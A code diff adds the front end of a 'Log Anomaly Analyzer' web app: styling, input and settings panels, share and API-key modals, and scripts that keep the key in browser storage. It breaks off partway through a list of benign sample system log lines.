+    background: rgba(210, 153, 34, 0.14);
+    border-color: rgba(210, 153, 34, 0.45);
+    color: #e3b341;
+  }
+  .sev-medium .sev-dot { background: #d29922; }
+
+  .sev-low {
+    background: rgba(88, 166, 255, 0.14);
+    border-color: rgba(88, 166, 255, 0.45);
+    color: #79b8ff;
+  }
+  .sev-low .sev-dot { background: #58a6ff; }
+
+  .sev-info {
+    background: rgba(139, 148, 158, 0.12);
+    border-color: rgba(139, 148, 158, 0.35);
+    color: var(--text-muted);
+  }
+  .sev-info .sev-dot { background: var(--text-muted); }
+
+  /* Row-level tint: subtle left border + faint bg */
+  .findings-table tbody tr.row-critical td:first-child { border-left: 3px solid #f85149; }
+  .findings-table tbody tr.row-high     td:first-child { border-left: 3px solid #db6d28; }
+  .findings-table tbody tr.row-medium   td:first-child { border-left: 3px solid #d29922; }
+  .findings-table tbody tr.row-low      td:first-child { border-left: 3px solid #58a6ff; }
+  .findings-table tbody tr.row-info     td:first-child { border-left: 3px solid var(--text-dim); }
+
+  .findings-table tbody tr.row-critical { background: rgba(248, 81, 73, 0.04); }
+  .findings-table tbody tr.row-high     { background: rgba(219, 109, 40, 0.035); }
+  .findings-table tbody tr.row-medium   { background: rgba(210, 153, 34, 0.035); }
+  .findings-table tbody tr.row-low      { background: rgba(88, 166, 255, 0.03); }
+
+  .findings-table tbody tr.row-critical:hover { background: rgba(248, 81, 73, 0.08); }
+  .findings-table tbody tr.row-high:hover     { background: rgba(219, 109, 40, 0.07); }
+  .findings-table tbody tr.row-medium:hover   { background: rgba(210, 153, 34, 0.07); }
+  .findings-table tbody tr.row-low:hover      { background: rgba(88, 166, 255, 0.06); }
+
+  @media (max-width: 768px) {
+    .findings-table-wrap {
+      max-height: 70vh;
+      -webkit-overflow-scrolling: touch;
+    }
+  }
+
+  /* ===== IP INTELLIGENCE PANEL ===== */
+  .ip-panel {
+    width: 100%;
+    margin-top: 16px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    box-shadow: var(--shadow);
+    overflow: hidden;
+  }
+
+  .ip-panel-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    padding: 14px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
+  }
+
+  .ip-panel-title {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+  }
+
+  .ip-panel-title .title-icon { font-size: 14px; }
+
+  .ip-filter-indicator {
+    display: none;
+    align-items: center;
+    gap: 8px;
+    padding: 4px 10px;
+    background: rgba(248, 81, 73, 0.1);
+    border: 1px solid rgba(248, 81, 73, 0.35);
+    border-radius: 999px;
+    font-size: 11px;
+    color: var(--text);
+  }
+
+  .ip-filter-indicator.visible { display: inline-flex; }
+
+  .ip-filter-indicator .clear-btn {
+    background: transparent;
+    border: none;
+    color: var(--accent-red);
+    cursor: pointer;
+    font-size: 11px;
+    padding: 0;
+    text-decoration: underline;
+  }
+
+  .ip-filter-indicator .clear-btn:hover { color: #ff7b74; }
+
+  .ip-table-wrap {
+    width: 100%;
+    max-height: 420px;
+    overflow: auto;
+  }
+
+  .ip-table {
+    width: 100%;
+    min-width: 720px;
+    border-collapse: separate;
+    border-spacing: 0;
+    font-size: 12.5px;
+    color: var(--text);
+  }
+
+  .ip-table thead th {
+    position: sticky;
+    top: 0;
+    z-index: 2;
+    background: #12171e;
+    color: var(--text-muted);
+    font-size: 10.5px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    text-align: left;
+    padding: 11px 14px;
+    border-bottom: 1px solid var(--border);
+    white-space: nowrap;
+  }
+
+  .ip-table tbody td {
+    padding: 11px 14px;
+    border-bottom: 1px solid var(--border-soft);
+    vertical-align: top;
+    line-height: 1.5;
+  }
+
+  .ip-table tbody tr:last-child td { border-bottom: none; }
+
+  .ip-col-ip { width: 170px; }
+  .ip-col-count { width: 110px; text-align: right; font-variant-numeric: tabular-nums; }
+  .ip-col-ctx { min-width: 280px; overflow-wrap: anywhere; word-break: break-word; }
+  .ip-col-label { width: 150px; }
+
+  .ip-table tbody tr { transition: background-color 0.15s ease; }
+  .ip-table tbody tr:hover { background: rgba(255, 255, 255, 0.02); }
+
+  .ip-table tbody tr.ip-suspicious { background: rgba(248, 81, 73, 0.05); }
+  .ip-table tbody tr.ip-suspicious:hover { background: rgba(248, 81, 73, 0.09); }
+  .ip-table tbody tr.ip-suspicious td:first-child { border-left: 3px solid rgba(248, 81, 73, 0.6); }
+
+  .ip-table tbody tr.ip-active {
+    background: rgba(248, 81, 73, 0.12) !important;
+    outline: 1px solid rgba(248, 81, 73, 0.45);
+    outline-offset: -1px;
+  }
+
+  .ip-clickable {
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    color: var(--text);
+    background: transparent;
+    border: 1px solid transparent;
+    padding: 3px 8px;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: background 0.15s ease, border-color 0.15s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .ip-clickable:hover {
+    background: rgba(248, 81, 73, 0.1);
+    border-color: rgba(248, 81, 73, 0.35);
+  }
+
+  .ip-clickable.is-active {
+    background: rgba(248, 81, 73, 0.18);
+    border-color: rgba(248, 81, 73, 0.6);
+    color: #ff7b74;
+  }
+
+  .ip-warn-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 0.6px;
+    text-transform: uppercase;
+    padding: 2px 7px;
+    border-radius: 999px;
+    background: rgba(248, 81, 73, 0.14);
+    border: 1px solid rgba(248, 81, 73, 0.45);
+    color: #ff7b74;
+    margin-left: 6px;
+    white-space: nowrap;
+  }
+
+  .ip-label-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 3px 9px;
+    border-radius: 999px;
+    font-size: 10.5px;
+    font-weight: 600;
+    letter-spacing: 0.7px;
+    text-transform: uppercase;
+    border: 1px solid transparent;
+    white-space: nowrap;
+  }
+
+  .ip-label-internal {
+    background: rgba(63, 185, 80, 0.12);
+    border-color: rgba(63, 185, 80, 0.4);
+    color: #56d364;
+  }
+
+  .ip-label-external {
+    background: rgba(219, 109, 40, 0.12);
+    border-color: rgba(219, 109, 40, 0.4);
+    color: #f0854a;
+  }
+
+  .ip-label-unknown {
+    background: rgba(139, 148, 158, 0.12);
+    border-color: rgba(139, 148, 158, 0.35);
+    color: var(--text-muted);
+  }
+
+  .ip-notes {
+    color: var(--text-muted);
+    font-size: 12px;
+    line-height: 1.5;
+  }
+
+  /* ===== NARRATIVE REPORT CARDS ===== */
+  .narrative-section {
+    width: 100%;
+    margin-top: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .narrative-heading {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    color: var(--text-muted);
+    margin-bottom: -4px;
+  }
+
+  .narrative-heading i { color: var(--accent-red); font-size: 12px; }
+
+  .nr-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    box-shadow: var(--shadow);
+    overflow: hidden;
+  }
+
+  .nr-card-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 13px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    background: linear-gradient(180deg, rgba(255, 255, 255, 0.02), transparent);
+  }
+
+  .nr-card-icon {
+    width: 30px;
+    height: 30px;
+    border-radius: 8px;
+    display: grid;
+    place-items: center;
+    font-size: 15px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border-soft);
+    flex-shrink: 0;
+  }
+
+  .nr-card-title {
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+    color: var(--text);
+  }
+
+  .nr-card-body {
+    padding: 16px 20px 18px;
+    color: var(--text);
+    font-size: 13px;
+    line-height: 1.65;
+  }
+
+  .nr-prose p {
+    margin: 0 0 12px;
+    color: var(--text);
+    overflow-wrap: anywhere;
+    word-break: break-word;
+    white-space: pre-wrap;
+  }
+
+  .nr-prose p:last-child { margin-bottom: 0; }
+
+  .nr-list {
+    margin: 0;
+    padding-left: 0;
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 9px;
+  }
+
+  .nr-list li {
+    position: relative;
+    padding: 8px 12px 8px 32px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    overflow-wrap: anywhere;
+    word-break: break-word;
+    line-height: 1.55;
+  }
+
+  .nr-list li::before {
+    content: "●";
+    position: absolute;
+    left: 12px;
+    top: 9px;
+    color: var(--accent-red);
+    font-size: 10px;
+  }
+
+  .nr-numbered {
+    counter-reset: nr-step;
+    margin: 0;
+    padding-left: 0;
+    list-style: none;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .nr-numbered li {
+    counter-increment: nr-step;
+    position: relative;
+    padding: 10px 14px 10px 48px;
+    background: var(--bg-elev);
+    border: 1px solid var(--border-soft);
+    border-left: 3px solid var(--accent-red);
+    border-radius: 8px;
+    overflow-wrap: anywhere;
+    word-break: break-word;
+    line-height: 1.55;
+  }
+
+  .nr-numbered li::before {
+    content: counter(nr-step);
+    position: absolute;
+    left: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    background: rgba(248, 81, 73, 0.15);
+    border: 1px solid rgba(248, 81, 73, 0.45);
+    color: #ff7b74;
+    display: grid;
+    place-items: center;
+    font-size: 11.5px;
+    font-weight: 700;
+    font-family: var(--font-mono);
+  }
+
+  .nr-numbered li:nth-child(1) { border-left-color: #f85149; }
+  .nr-numbered li:nth-child(2) { border-left-color: #db6d28; }
+  .nr-numbered li:nth-child(3) { border-left-color: #d29922; }
+  .nr-numbered li:nth-child(n+4) { border-left-color: var(--border); }
+
+  @media (max-width: 768px) {
+    .ip-table-wrap { -webkit-overflow-scrolling: touch; }
+    .nr-card-body { padding: 14px 16px 16px; }
+  }
+
+  /* ===== FOCUS-VISIBLE (A11Y) ===== */
+  .header-btn:focus-visible,
+  .tb-btn:focus-visible,
+  .log-tab:focus-visible,
+  .settings-toggle:focus-visible,
+  .modal-close:focus-visible,
+  .ip-clickable:focus-visible,
+  .ip-filter-indicator .clear-btn:focus-visible,
+  .tl-marker:focus-visible {
+    outline: 2px solid rgba(248, 81, 73, 0.7);
+    outline-offset: 2px;
+    border-radius: 6px;
+  }
+
+  .log-textarea:focus-visible,
+  .text-input:focus-visible,
+  .text-area-sm:focus-visible,
+  .share-textarea:focus-visible {
+    outline: none;
+  }
+
+  /* ===== SEVERITY GLYPHS (icon + text, not color alone) ===== */
+  .sev-badge .sev-glyph {
+    font-size: 11px;
+    line-height: 1;
+    font-weight: 700;
+    letter-spacing: 0;
+    display: inline-block;
+    min-width: 10px;
+    text-align: center;
+  }
+
+  /* ===== MOBILE POLISH (<768px) ===== */
+  @media (max-width: 768px) {
+    /* Log type tabs: horizontal scrolling strip */
+    .log-tabs {
+      flex-wrap: nowrap;
+      overflow-x: auto;
+      overflow-y: hidden;
+      padding: 6px;
+      scrollbar-width: thin;
+      -webkit-overflow-scrolling: touch;
+    }
+    .log-tabs::-webkit-scrollbar { height: 4px; }
+    .log-tab {
+      flex: 0 0 auto;
+      min-width: auto;
+      padding: 8px 12px;
+      scroll-snap-align: start;
+    }
+
+    /* Buttons full-width on mobile */
+    .input-actions {
+      flex-direction: column;
+    }
+    .input-actions .btn {
+      width: 100%;
+      flex: 1 1 auto;
+    }
+
+    .output-toolbar {
+      padding: 10px 12px;
+      gap: 6px;
+    }
+    .output-toolbar .tb-btn {
+      flex: 1 1 100%;
+      justify-content: center;
+      padding: 10px 12px;
+      font-size: 13px;
+    }
+
+    .modal-footer {
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .modal-footer .btn {
+      width: 100%;
+      flex: 1 1 auto !important;
+    }
+
+    /* Timeline: horizontal scroll on narrow viewports */
+    .timeline-section {
+      padding: 16px 14px 18px;
+    }
+    .timeline-scroll {
+      overflow-x: auto;
+      overflow-y: visible;
+      -webkit-overflow-scrolling: touch;
+      padding-bottom: 8px;
+      margin: 0 -14px;
+      padding-left: 14px;
+      padding-right: 14px;
+    }
+    .timeline-track {
+      min-width: 560px;
+      margin: 0;
+    }
+    .timeline-axis {
+      min-width: 560px;
+    }
+
+    /* Tables: ensure they scroll horizontally inside their cards */
+    .findings-table-wrap,
+    .ip-table-wrap {
+      overflow-x: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+  }
+
+  /* ===== PRINT STYLES ===== */
+  @media print {
+    html, body {
+      background: #ffffff !important;
+      color: #000000 !important;
+      margin: 0 !important;
+      padding: 0 !important;
+      font-size: 11pt;
+    }
+    body::before { display: none !important; }
+
+    /* Hide chrome, input side, toolbar, modals, toasts */
+    .app-header,
+    #input-panel,
+    #output-toolbar,
+    .output-toolbar,
+    .modal-overlay,
+    .toast,
+    .spinner-overlay,
+    .status-pill,
+    .header-btn,
+    .ip-filter-indicator,
+    .ip-clickable,
+    button {
+      display: none !important;
+    }
+
+    .app-main {
+      display: block !important;
+      grid-template-columns: none !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      max-width: none !important;
+    }
+
+    #output-panel {
+      width: 100% !important;
+      min-height: auto !important;
+      border: none !important;
+      box-shadow: none !important;
+      background: #ffffff !important;
+      position: static !important;
+      overflow: visible !important;
+    }
+
+    .panel,
+    .panel-body,
+    .panel-header {
+      background: #ffffff !important;
+      color: #000000 !important;
+      border: none !important;
+      box-shadow: none !important;
+      padding: 0 !important;
+    }
+
+    .panel-title,
+    .panel-title i,
+    h1, h2, h3, p, span, div, td, th, li {
+      color: #000000 !important;
+    }
+
+    /* Defeat sticky positioning */
+    .output-toolbar,
+    .findings-table thead th,
+    .ip-table thead th {
+      position: static !important;
+    }
+
+    /* Cards — white bg, visible borders */
+    .timeline-section,
+    .ip-panel,
+    .nr-card,
+    .findings-table-wrap,
+    .findings-section,
+    .narrative-section,
+    .result-placeholder {
+      background: #ffffff !important;
+      border: 1px solid #888 !important;
+      box-shadow: none !important;
+      color: #000 !important;
+      page-break-inside: avoid;
+    }
+
+    /* Page breaks before each major section */
+    .timeline-section,
+    .findings-section,
+    .ip-panel,
+    .narrative-section {
+      page-break-before: always;
+      break-before: page;
+      margin-top: 0 !important;
+    }
+    .result-placeholder + .timeline-section,
+    .result-placeholder + .findings-section,
+    .result-placeholder + .ip-panel,
+    .result-placeholder + .narrative-section,
+    .panel-body > *:first-child,
+    .panel-body > *:first-child + * {
+      page-break-before: auto;
+      break-before: auto;
+    }
+
+    .nr-card,
+    .findings-table tbody tr,
+    .ip-table tbody tr,
+    .nr-list li,
+    .nr-numbered li {
+      page-break-inside: avoid;
+      break-inside: avoid;
+    }
+
+    /* Kill scrollbars and overflow clipping */
+    .findings-table-wrap,
+    .ip-table-wrap,
+    .timeline-scroll {
+      max-height: none !important;
+      overflow: visible !important;
+    }
+
+    /* Tables: print-friendly */
+    .findings-table,
+    .ip-table {
+      min-width: 0 !important;
+      width: 100% !important;
+    }
+    .findings-table thead th,
+    .ip-table thead th {
+      background: #f0f0f0 !important;
+      color: #000 !important;
+      border-bottom: 1px solid #666 !important;
+    }
+    .findings-table tbody td,
+    .ip-table tbody td {
+      border-bottom: 1px solid #ccc !important;
+    }
+    .findings-table tbody tr.row-critical td:first-child,
+    .findings-table tbody tr.row-high td:first-child,
+    .findings-table tbody tr.row-medium td:first-child,
+    .findings-table tbody tr.row-low td:first-child {
+      border-left-color: #000 !important;
+    }
+
+    .col-ev, .evidence {
+      background: #f5f5f5 !important;
+      color: #000 !important;
+      border: 1px solid #bbb !important;
+    }
+
+    /* Severity badges — retain shape + label with print-safe borders */
+    .sev-badge {
+      border: 1px solid #000 !important;
+      color: #000 !important;
+      background: #fff !important;
+    }
+
+    /* Timeline — keep markers visible on paper */
+    .tl-marker {
+      border: 1px solid #000 !important;
+      box-shadow: none !important;
+    }
+    .tl-tooltip { display: none !important; }
+    .timeline-line { background: #888 !important; }
+
+    /* Narrative cards */
+    .nr-card {
+      background: #fff !important;
+      border: 1px solid #666 !important;
+    }
+    .nr-card-icon {
+      background: #f0f0f0 !important;
+      border: 1px solid #888 !important;
+    }
+    .nr-list li, .nr-numbered li {
+      background: #fff !important;
+      border: 1px solid #aaa !important;
+    }
+    .nr-numbered li::before {
+      background: #fff !important;
+      border: 1px solid #000 !important;
+      color: #000 !important;
+    }
+
+    /* Links plain in print */
+    a { color: #000 !important; text-decoration: none !important; }
+    ::-webkit-scrollbar { display: none !important; }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 10px; height: 10px; }
+  ::-webkit-scrollbar-track { background: var(--bg-body); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 6px; }
+  ::-webkit-scrollbar-thumb:hover { background: #3d4654; }
+</style>
+</head>
+<body>
+
+<header class="app-header">
+  <div class="brand">
+    <div class="brand-mark">
+      <i class="fa-solid fa-shield-halved"></i>
+    </div>
+    <div class="brand-text">
+      <h1>🛡️ Log Anomaly Analyzer</h1>
+      <p>Detect, triage and investigate suspicious activity across your log streams</p>
+    </div>
+  </div>
+  <div class="header-meta">
+    <button class="header-btn unset" id="btn-api-key" type="button" title="Manage Anthropic API key">
+      <span>🔑</span>
+      <span>API Key</span>
+      <span class="key-mask" id="header-key-mask">not set</span>
+    </button>
+    <span class="status-pill">
+      <span class="status-dot"></span> Engine Online
+    </span>
+    <span><i class="fa-regular fa-clock"></i> <span id="clock">--:--:--</span></span>
+  </div>
+</header>
+
+<main class="app-main">
+  <section class="panel" id="input-panel">
+    <div class="panel-header">
+      <div class="panel-title">
+        <i class="fa-solid fa-terminal"></i> Input
+      </div>
+    </div>
+    <div class="panel-body">
+      <div class="log-type-label">Log Type</div>
+      <div class="log-tabs" role="tablist" id="log-tabs">
+        <button class="log-tab active" data-type="system" role="tab" aria-selected="true">
+          <span class="tab-emoji">🖥️</span> System
+        </button>
+        <button class="log-tab" data-type="auth" role="tab" aria-selected="false">
+          <span class="tab-emoji">🔐</span> Auth
+        </button>
+        <button class="log-tab" data-type="network" role="tab" aria-selected="false">
+          <span class="tab-emoji">🌐</span> Network
+        </button>
+        <button class="log-tab" data-type="application" role="tab" aria-selected="false">
+          <span class="tab-emoji">📱</span> Application
+        </button>
+        <button class="log-tab" data-type="audit" role="tab" aria-selected="false">
+          <span class="tab-emoji">📋</span> Audit
+        </button>
+        <button class="log-tab" data-type="mixed" role="tab" aria-selected="false">
+          <span class="tab-emoji">🔀</span> Mixed
+        </button>
+      </div>
+
+      <div class="input-wrap">
+        <textarea
+          id="log-input"
+          class="log-textarea"
+          spellcheck="false"
+          autocomplete="off"
+          placeholder="Paste your raw log output here... Supports: syslog, auth.log, access.log, audit.log, Windows Event Log, and more."
+        ></textarea>
+      </div>
+
+      <div class="input-counter">
+        <div>
+          <span class="counter-value" id="line-count">0</span>
+          <span> lines</span>
+          <span class="counter-divider">·</span>
+          <span class="counter-value" id="char-count">0</span>
+          <span> characters</span>
+        </div>
+        <div id="counter-meta" style="color: var(--text-dim);">ready</div>
+      </div>
+
+      <div class="settings" id="settings">
+        <button class="settings-toggle" type="button" id="settings-toggle" aria-expanded="false">
+          <span>⚙️ Analysis Settings</span>
+          <i class="fa-solid fa-chevron-down chev"></i>
+        </button>
+        <div class="settings-body">
+
+          <div class="field">
+            <div class="field-label">Sensitivity Level</div>
+            <div class="radio-group" role="radiogroup" aria-label="Sensitivity Level">
+              <div class="radio-pill">
+                <input type="radio" name="sensitivity" id="sens-standard" value="standard" checked />
+                <label for="sens-standard">🟢 Standard</label>
+              </div>
+              <div class="radio-pill">
+                <input type="radio" name="sensitivity" id="sens-moderate" value="moderate" />
+                <label for="sens-moderate">🟡 Moderate</label>
+              </div>
+              <div class="radio-pill">
+                <input type="radio" name="sensitivity" id="sens-high" value="high" />
+                <label for="sens-high">🔴 High</label>
+              </div>
+            </div>
+          </div>
+
+          <div class="field">
+            <div class="field-label">
+              Timezone <span class="field-hint">(optional)</span>
+            </div>
+            <input
+              type="text"
+              id="setting-timezone"
+              class="text-input"
+              placeholder="e.g., UTC+4, EST, IST"
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="field">
+            <div class="field-label">
+              Known Safe IPs <span class="field-hint">(one per line, optional)</span>
+            </div>
+            <textarea
+              id="setting-safe-ips"
+              class="text-area-sm"
+              spellcheck="false"
+              autocomplete="off"
+              placeholder="10.0.0.5&#10;192.168.1.10&#10;203.0.113.42"
+            ></textarea>
+          </div>
+
+          <div class="field">
+            <div class="field-label">
+              Known Admin Accounts <span class="field-hint">(one per line, optional)</span>
+            </div>
+            <textarea
+              id="setting-admins"
+              class="text-area-sm"
+              spellcheck="false"
+              autocomplete="off"
+              placeholder="root&#10;administrator&#10;svc_deploy"
+            ></textarea>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="input-actions">
+        <button class="btn btn-secondary" id="btn-load-sample" type="button">
+          <span>📂</span> Load Sample Log
+        </button>
+        <button class="btn btn-primary" id="btn-analyze" type="button">
+          <span>🔍</span> Analyze Logs
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <section class="panel" id="output-panel" aria-label="Analysis output">
+    <div class="panel-header">
+      <div class="panel-title">
+        <i class="fa-solid fa-radar" aria-hidden="true"></i> Analysis
+      </div>
+    </div>
+    <div class="output-toolbar" id="output-toolbar" role="toolbar" aria-label="Analysis actions">
+      <button class="tb-btn" id="btn-copy-report" type="button" disabled aria-label="Copy report as plain text">📋 Copy Report</button>
+      <button class="tb-btn" id="btn-download-json" type="button" disabled aria-label="Download raw JSON">📥 Download JSON</button>
+      <button class="tb-btn" id="btn-download-html" type="button" disabled aria-label="Download printable HTML report">📄 Download HTML Report</button>
+      <button class="tb-btn tb-btn-danger" id="btn-analyze-new" type="button" aria-label="Clear and analyze a new log">🔄 Analyze New Log</button>
+      <button class="tb-btn" id="btn-share-summary" type="button" disabled aria-label="Share a short summary">📤 Share Summary</button>
+    </div>
+    <div class="panel-body placeholder-body" aria-live="polite" aria-atomic="false">
+      <div class="placeholder">
+        <i class="fa-solid fa-chart-line"></i>
+        OUTPUT PANEL goes here
+      </div>
+    </div>
+  </section>
+</main>
+
+<div class="modal-overlay modal-wide" id="share-modal" role="dialog" aria-modal="true" aria-labelledby="share-modal-title">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title" id="share-modal-title">
+        <i class="fa-solid fa-share-nodes"></i> Share Summary
+      </div>
+      <button class="modal-close" id="share-modal-close" type="button" aria-label="Close">
+        <i class="fa-solid fa-xmark"></i>
+      </button>
+    </div>
+    <div class="modal-body">
+      <p>Copy this short summary into email or Slack. Includes the risk rating, top 3 findings, and immediate actions.</p>
+      <textarea id="share-textarea" class="share-textarea" spellcheck="false" readonly></textarea>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-secondary" id="share-modal-cancel" type="button">Close</button>
+      <button class="btn btn-primary" id="share-modal-copy" type="button" style="flex: 0 0 auto;">
+        <span>📋</span> Copy
+      </button>
+    </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="api-modal" role="dialog" aria-modal="true" aria-labelledby="api-modal-title">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title" id="api-modal-title">
+        <i class="fa-solid fa-key"></i> Anthropic API Key
+      </div>
+      <button class="modal-close" id="api-modal-close" type="button" aria-label="Close">
+        <i class="fa-solid fa-xmark"></i>
+      </button>
+    </div>
+    <div class="modal-body">
+      <p>
+        This key is stored locally in your browser (<code>localStorage</code>) and is sent only
+        to Anthropic when you analyze logs. Get one at
+        <a href="https://console.anthropic.com/" target="_blank" rel="noopener">console.anthropic.com</a>.
+      </p>
+      <div class="key-current" id="api-modal-current" style="display:none;">
+        <span id="api-modal-current-mask">—</span>
+        <span class="pill">saved</span>
+      </div>
+      <div class="field">
+        <div class="field-label">API Key</div>
+        <input
+          type="password"
+          id="api-key-input"
+          class="text-input"
+          placeholder="sk-ant-api03-..."
+          autocomplete="off"
+          spellcheck="false"
+        />
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-secondary" id="api-modal-cancel" type="button">Cancel</button>
+      <button class="btn btn-primary" id="api-modal-save" type="button" style="flex: 0 0 auto;">
+        <span>💾</span> Save Key
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+  (function () {
+    const clock = document.getElementById('clock');
+    function tick() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, '0');
+      clock.textContent = `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} UTC${-d.getTimezoneOffset() / 60 >= 0 ? '+' : ''}${-d.getTimezoneOffset() / 60}`;
+    }
+    tick();
+    setInterval(tick, 1000);
+  })();
+
+  /* ===== Log Type Tabs ===== */
+  (function () {
+    const tabs = document.querySelectorAll('#log-tabs .log-tab');
+    let activeType = 'system';
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        tabs.forEach(t => {
+          t.classList.remove('active');
+          t.setAttribute('aria-selected', 'false');
+        });
+        tab.classList.add('active');
+        tab.setAttribute('aria-selected', 'true');
+        activeType = tab.dataset.type;
+      });
+    });
+    window.__getLogType = () => activeType;
+  })();
+
+  /* ===== Live Counter ===== */
+  (function () {
+    const ta = document.getElementById('log-input');
+    const lineEl = document.getElementById('line-count');
+    const charEl = document.getElementById('char-count');
+    const metaEl = document.getElementById('counter-meta');
+
+    function fmt(n) { return n.toLocaleString('en-US'); }
+
+    function update() {
+      const v = ta.value;
+      const chars = v.length;
+      const lines = v.length === 0 ? 0 : v.split(/\r\n|\r|\n/).length;
+      lineEl.textContent = fmt(lines);
+      charEl.textContent = fmt(chars);
+      metaEl.textContent = chars === 0 ? 'ready' : 'buffered';
+      metaEl.style.color = chars === 0 ? 'var(--text-dim)' : 'var(--success-green)';
+    }
+
+    ta.addEventListener('input', update);
+    ta.addEventListener('paste', () => setTimeout(update, 0));
+    update();
+  })();
+
+  /* ===== Collapsible Settings ===== */
+  (function () {
+    const root = document.getElementById('settings');
+    const toggle = document.getElementById('settings-toggle');
+    toggle.addEventListener('click', () => {
+      const open = root.classList.toggle('open');
+      toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
+    });
+  })();
+
+  /* ===== API Key Manager ===== */
+  (function () {
+    const STORAGE_KEY = 'laa_api_key';
+    const modal = document.getElementById('api-modal');
+    const openBtn = document.getElementById('btn-api-key');
+    const closeBtn = document.getElementById('api-modal-close');
+    const cancelBtn = document.getElementById('api-modal-cancel');
+    const saveBtn = document.getElementById('api-modal-save');
+    const input = document.getElementById('api-key-input');
+    const headerMask = document.getElementById('header-key-mask');
+    const currentBox = document.getElementById('api-modal-current');
+    const currentMask = document.getElementById('api-modal-current-mask');
+
+    function maskKey(k) {
+      if (!k) return 'not set';
+      if (k.length <= 10) return '••••••';
+      const head = k.slice(0, 7);
+      const tail = k.slice(-4);
+      return `${head}…${tail}`;
+    }
+
+    function getKey() {
+      try { return localStorage.getItem(STORAGE_KEY) || ''; }
+      catch (_) { return ''; }
+    }
+
+    function setKey(k) {
+      try { localStorage.setItem(STORAGE_KEY, k); }
+      catch (_) { /* ignore */ }
+    }
+
+    function refreshHeader() {
+      const k = getKey();
+      headerMask.textContent = maskKey(k);
+      openBtn.classList.toggle('unset', !k);
+      openBtn.title = k ? 'Update Anthropic API key' : 'Set your Anthropic API key';
+    }
+
+    function openModal() {
+      const k = getKey();
+      input.value = '';
+      if (k) {
+        currentBox.style.display = 'flex';
+        currentMask.textContent = maskKey(k);
+        input.placeholder = 'Paste a new key to replace…';
+      } else {
+        currentBox.style.display = 'none';
+        input.placeholder = 'sk-ant-api03-...';
+      }
+      modal.classList.add('open');
+      setTimeout(() => input.focus(), 50);
+    }
+
+    function closeModal() {
+      modal.classList.remove('open');
+      input.value = '';
+    }
+
+    function save() {
+      const v = input.value.trim();
+      if (!v) {
+        input.style.borderColor = 'var(--accent-red)';
+        setTimeout(() => { input.style.borderColor = ''; }, 1200);
+        return;
+      }
+      setKey(v);
+      refreshHeader();
+      closeModal();
+    }
+
+    openBtn.addEventListener('click', openModal);
+    closeBtn.addEventListener('click', closeModal);
+    cancelBtn.addEventListener('click', closeModal);
+    saveBtn.addEventListener('click', save);
+
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) closeModal();
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('open')) closeModal();
+      if (e.key === 'Enter' && modal.classList.contains('open') && document.activeElement === input) save();
+    });
+
+    window.__getApiKey = getKey;
+    window.__maskKey = maskKey;
+
+    refreshHeader();
+    if (!getKey()) openModal();
+  })();
+
+  /* ===== Sample Logs ===== */
+  const SAMPLE_LOGS = {
+    system: [
+      'Apr 17 02:14:03 web-prod-04 kernel: [284512.118432] CPU0: Core temperature above threshold, cpu clock throttled (total events = 1)',
+      'Apr 17 02:14:09 web-prod-04 systemd[1]: nginx.service: Main process exited, code=killed, status=9/KILL',
+      'Apr 17 02:14:09 web-prod-04 systemd[1]: nginx.service: Failed with result \'signal\'.',
+      'Apr 17 02:14:10 web-prod-04 systemd[1]: nginx.service: Scheduled restart job, restart counter is at 4.',
+      'Apr 17 02:14:11 web-prod-04 kernel: [284520.443201] Out of memory: Killed process 18422 (java) total-vm:8421244kB, anon-rss:6112880kB',
